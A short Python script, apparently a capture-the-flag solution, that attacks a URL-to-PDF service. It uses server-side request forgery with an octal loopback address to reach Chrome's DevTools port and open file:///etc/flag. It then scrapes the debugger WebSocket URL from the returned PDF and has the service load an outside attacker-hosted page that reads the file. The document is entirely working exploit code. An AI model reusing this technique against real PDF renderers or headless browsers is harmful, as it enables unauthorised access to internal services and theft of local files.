import requests
import sys
import pdfplumber
import json
import re

IPPORT = 'localhost:3334'

if len(sys.argv) > 1:
    IPPORT = sys.argv[1]


with open('resp.pdf', 'wb') as f:
    r = requests.post('http://{}/pdf'.format(IPPORT),
                      data={'url': 'http://0177.0.0.1:9222/json/new?file:///etc/flag'})
    f.write(r.content)

regex = r"webSocketDebuggerUrl\": \"(.*)\""

with pdfplumber.open("resp.pdf") as pdf:
    first_page = pdf.pages[0]
    matches = re.findall(regex, first_page.extract_text())
    print(matches)
    url_s = 'http://task.shadowservants.ru:7777/wshack1234.html#' + matches[0]
    print(url_s)
    r = requests.post('http://{}/pdf'.format(IPPORT),
                      data={'url': url_s})
    with open('resp_flag.pdf', 'wb') as f:
        f.write(r.content)
    with pdfplumber.open('resp_flag.pdf') as pdf:
        flag_page = pdf.pages[0]
        print(flag_page.extract_text())

